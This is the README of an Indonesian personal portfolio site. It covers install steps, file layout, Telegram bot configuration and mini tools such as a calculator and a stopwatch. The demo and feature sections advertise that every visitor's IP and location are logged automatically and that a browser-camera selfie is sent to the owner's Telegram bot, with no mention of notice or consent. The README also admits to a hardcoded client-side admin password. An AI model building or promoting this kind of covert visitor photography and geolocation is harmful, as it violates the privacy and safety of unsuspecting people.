<h1 align="center">

```
▗▄▄▖  ▗▄▖ ▗▄▄▖ ▗▄▄▄▖ ▗▄▖ ▗▄▄▄▖ ▗▄▖ ▗▖    ▄▄▄  ▗▄▖ 
▐▛▀▜▖ █▀█ ▐▛▀▜▌▝▀█▀▘ █▀█ ▐▛▀▀▘ █▀█ ▐▌    ▀█▀  █▀█ 
▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌  █  ▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌     █  ▐▌ ▐▌
▐██▛ ▐▌ ▐▌▐███   █  ▐▌ ▐▌▐███ ▐▌ ▐▌▐▌     █  ▐▌ ▐▌
▐▌   ▐▌ ▐▌▐▌▝█▖  █  ▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌     █  ▐▌ ▐▌
▐▌    █▄█ ▐▌ ▐▌  █   █▄█ ▐▌    █▄█ ▐▙▄▄▖ ▄█▄  █▄█ 
▝▘    ▝▀▘ ▝▘ ▝▀  ▀   ▝▀▘ ▝▘    ▝▀▘ ▝▀▀▀▘ ▀▀▀  ▝▀▘ 
```

</h1>

<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-3.0.11-blue.svg?cacheSeconds=2592000&style=for-the-badge" />
  <a href="https://portofolio-yanz.vercel.app/" target="_blank">
    <img alt="Live Demo" src="https://img.shields.io/badge/LIVE_DEMO-portofolio--yanz.vercel.app-00c853.svg?style=for-the-badge&logo=vercel" />
  </a>
  <a href="#" target="_blank">
    <img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge" />
  </a>
</p>

<p align="center">
  <a href="https://twitter.com/yanzxd" target="_blank">
    <img alt="Twitter: yanzxd" src="https://img.shields.io/twitter/follow/yanzxd.svg?style=social&label=Follow" />
  </a>
  <img alt="Repo size" src="https://img.shields.io/github/repo-size/TheyanzXD/Portofolio-yanzxd?style=for-the-badge" />
  <img alt="Last commit" src="https://img.shields.io/github/last-commit/TheyanzXD/Portofolio-yanzxd?style=for-the-badge" />
</p>

<p align="center">
  <b>Portfolio personal dengan IP tracking, Telegram notifikasi, Spotify playlist, dan mini tools interaktif.</b>
</p>

---

## Demo

> **Live:** [portofolio-yanz.vercel.app](https://portofolio-yanz.vercel.app/)

Visitor yang mengunjungi website akan otomatis:
- 📍 IP & lokasi dicatat
- 📸 Foto selfie dikirim ke Telegram Bot
- 🎵 Playlist Spotify ditampilkan

---

## Fitur

| Kategori | Fitur |
|----------|-------|
| **Tracking** | IP logging, geolocation, visitor dashboard (admin panel) |
| **Kamera** | Selfie langsung dari browser, foto dikirim ke Telegram |
| **Musik** | Integrasi Spotify playlist favorit |
| **Tools** | Kalkulator, stopwatch, konversi suhu, random picker, tebak angka, quotes |
| **Admin** | Panel pengunjung dengan export ke CSV |

---

## Tech Stack

```
Frontend  → HTML5, CSS3, Vanilla JavaScript
Backend   → Node.js (native http module)
Deploy    → Vercel (serverless)
Integrasi → Telegram Bot API, Spotify
```

---

## Instalasi

```bash
# Clone repo
git clone https://github.com/TheyanzXD/Portofolio-yanzxd.git
cd Portofolio-yanzxd

# Setup environment
cp .env.example .env
# Edit .env → isi TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID

# Install & jalankan
npm install
npm start
```

Buka `http://localhost:3000` di browser.

---

## Struktur

```
.
├── index.html            # Halaman utama
├── pengunjung.html       # Admin panel (visitor log)
├── kalkulator.html       # Kalkulator
├── stopwatch.html        # Stopwatch
├── konversi-suhu.html    # Konversi suhu
├── tebak-angka.html      # Game tebak angka
├── quotes.html           # Random quotes
├── random-picker.html    # Random picker
├── ui/
│   └── style.css         # Global styles
├── Backend/
│   └── server.js         # Server (API handlers)
├── api/
│   └── index.js          # Vercel entry point
├── data/
│   ├── database.json     # Visitor data
│   └── playlist.json     # Spotify playlist
├── .env                  # Secrets (jangan commit!)
├── vercel.json           # Vercel config
└── package.json
```

---

## Konfigurasi

Buat file `.env` di root project:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

> **Cara dapat token:** Buka [@BotFather](https://t.me/BotFather) di Telegram → `/newbot` → copy token.

---

## Admin Panel

Akses panel admin di `/pengunjung.html`. Ganti password default di file `pengunjung.html` sebelum deploy.

> ⚠️ Password saat ini masih di client-side. Untuk production, pertimbangkan autentikasi server-side.

---

## Known Issues

- Data visitor tidak persisten di Vercel (ephemeral `/tmp`)
- Password admin hardcoded di client-side
- Tidak ada rate limiting

Lihat `penjelasan.txt` untuk daftar lengkap.

---

## Author

**@TheyanzXD**

| Platform | Link |
|----------|------|
| Website | [portofolio-yanz.vercel.app](https://portofolio-yanz.vercel.app/) |
| Twitter | [@yanzxd](https://twitter.com/yanzxd) |
| GitHub | [@TheyanzXD](https://github.com/TheyanzXD) |
| LinkedIn | [@muhammadizyan](https://linkedin.com/in/muhammadizyan) |

---

## License

Distributed under the **MIT License**. Lihat `LICENSE` untuk info lebih lanjut.

---

<p align="center">
  <i>Dibuat dengan ❤️ oleh YanzXD</i>
</p>
